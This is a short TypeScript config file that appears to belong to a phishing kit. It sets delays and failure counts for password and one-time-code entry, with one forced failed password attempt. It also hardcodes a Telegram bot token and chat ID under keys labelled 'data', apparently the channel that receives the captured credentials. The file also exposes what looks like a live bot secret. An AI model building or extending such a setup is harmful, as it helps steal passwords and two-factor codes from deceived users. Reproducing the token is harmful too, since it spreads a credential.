interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 12000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    password_loading_time: 8000,
  },
  telegram: {
    data_chatid: "-1002674039533",
    data_token: "7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
